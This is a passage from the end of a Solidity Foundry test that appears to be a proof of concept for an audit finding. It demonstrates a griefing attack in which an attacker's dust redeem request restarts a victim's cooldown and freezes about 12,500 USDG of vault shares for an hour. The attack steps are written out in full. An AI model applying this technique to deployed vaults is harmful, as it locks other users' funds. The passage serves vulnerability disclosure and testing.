        uint256 walletSharesBeforeClearing = juniorVault.balanceOf(victim);
        vm.prank(victim);
        assertEq(juniorVault.claimRedeemRefund(poisonId, victim, victim), 1, "clearing hands the victim 1 dust unit");

        uint256 clearedAt = vm.getBlockTimestamp();
        uint256 frozenShares = juniorVault.balanceOf(victim);
        assertEq(frozenShares, walletSharesBeforeClearing + 1, "victim's wallet now carries the attacker's dust");
        assertEq(juniorVault.controllerRedeemHead(victim), victimRequestId, "head only advances after clearing");
        assertEq(juniorVault.lastDepositTime(victim), clearedAt, "IMPACT: victim's cooldown restarted by clearing");
        assertEq(juniorVault.maxRequestRedeem(victim), 0, "IMPACT: no further redemption can be requested");
        assertApproxEqRel(
            juniorVault.estimateRedeemAssets(frozenShares),
            12_500e6,
            0.01e18,
            "IMPACT: ~12,500 USDG of wallet shares are frozen"
        );

        vm.prank(victim);
        vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
        juniorVault.transfer(victimColdWallet, frozenShares);

        vm.prank(victim);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        juniorVault.requestRedeem(frozenShares, victim, victim);

        vm.prank(victim);
        assertEq(
            juniorVault.redeem(fundedShares, victim, victim),
            fundedAssets,
            "the standard claim works only after the victim accepted the forced cooldown"
        );
        assertEq(usdg.balanceOf(victim), fundedAssets, "victim finally receives the funded USDG");

        // =============================================================================================
        // STEP 8 - The freeze lasts the full hour, and the attacker earned nothing (pure griefing).
        // =============================================================================================
        vm.warp(clearedAt + juniorVault.DEPOSIT_COOLDOWN() - 1);
        assertEq(juniorVault.maxRequestRedeem(victim), 0, "IMPACT: still frozen one second before the hour ends");
        vm.prank(victim);
        vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
        juniorVault.transfer(victimColdWallet, frozenShares);

        vm.warp(clearedAt + juniorVault.DEPOSIT_COOLDOWN());
        assertEq(juniorVault.maxRequestRedeem(victim), frozenShares, "wallet unlocks only after the full hour");

        assertEq(juniorVault.balanceOf(attackerSybil), 0, "attacker's sybil ends with nothing");
        assertEq(juniorVault.balanceOf(attacker), attackerShares - 1, "attack cost: a single share unit");
        assertEq(juniorVault.estimateRedeemAssets(1), 0, "that share unit is worth zero USDG: no profit, pure griefing");
    }

}
```
